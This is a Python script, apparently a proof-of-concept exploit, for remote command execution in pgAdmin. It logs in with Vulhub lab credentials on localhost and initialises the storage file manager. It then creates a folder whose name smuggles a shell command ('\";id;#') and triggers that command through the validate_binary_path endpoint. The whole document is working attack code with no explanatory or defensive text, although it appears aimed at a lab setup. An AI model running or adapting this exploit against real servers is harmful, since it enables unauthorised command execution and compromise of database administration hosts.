import requests  
import re  
import json

def exploit_pgadmin_rce(target_url):  
    with requests.Session() as s:  
        # Step 1: Get the initial CSRF token  
        login_url = f"{target_url}/"  
        response = s.get(login_url)
        csrf_token_global = re.search(r'"csrfToken": "(.*?)"', response.text).group(1)  
        if response.status_code == 200 and csrf_token_global:
            print(f"[+] Step 1: GET /login success, X-Request-Id: {response.headers.get('X-Request-Id')}")

        # Step 2: Login  
        login_data = {  
            "csrf_token": csrf_token_global,  
            "email": "vulhub@example.com",  
            "password": "vulhub",  
        }  
        resp = s.post(f"{target_url}/authenticate/login", data=login_data) 
        if resp.status_code == 200:  
            print(f"[+] Step 2: POST /authenticate/login success, X-Request-Id: {resp.headers.get('X-Request-Id')}")

        # Step 3: Initialize the file manager  
        headers = {  
            "X-pgA-CSRFToken": csrf_token_global,  
            "Content-Type": "application/json"  
        }  
        init_data = {  
            "dialog_type": "storage_dialog",  
            #"supported_types": ["sql", "csv", "json", "*"],  
            "supported_types": "sql",
            "dialog_title": "Storage Manager"  
        }
        init_resp = s.post(f"{target_url}/file_manager/init", json=init_data, headers=headers, allow_redirects=False)  
        # Dynamically extract storage_id  
        response_data = json.loads(init_resp.text)  
        storage_id = response_data["data"]["transId"]
        if not storage_id:  
            raise ValueError("Failed to get storage_id from response")  
        if init_resp.status_code == 200:  
            print(f"[+] Step 3: POST /file_manager/init success, storage_id: {storage_id}, X-Request-Id: {init_resp.headers.get('X-Request-Id')}")

        # Step 4: Create a malicious folder 
        payload = {  
            "path": "/",  
            "mode": "addfolder",   
            "name": "\";id;#",  # Command injection payload  
            "storage_folder": "my_storage"  
        }  
        resp = s.post(f"{target_url}/file_manager/filemanager/{storage_id}", json=payload, headers=headers)  
        #print(resp.json())
        if resp.status_code == 200:
            print(f"[+] Step 4: POST /file_manager/filemanager/{storage_id} success, X-Request-Id: {resp.headers.get('X-Request-Id')}")

        # Step 5: Trigger command execution
        exploit_data = {  
            "utility_path": f"/var/lib/pgadmin/storage/vulhub_example.com/\";id;#"  
        }  
        final_resp = s.post(f"{target_url}/misc/validate_binary_path", json=exploit_data, headers=headers) 
        if final_resp.status_code == 200:  
            print(f"[+] Step 5: POST /misc/validate_binary_path success, X-Request-Id: {final_resp.headers.get('X-Request-Id')}")
        return final_resp.json() 

if __name__ == "__main__":  
    print(exploit_pgadmin_rce("http://localhost:5050"))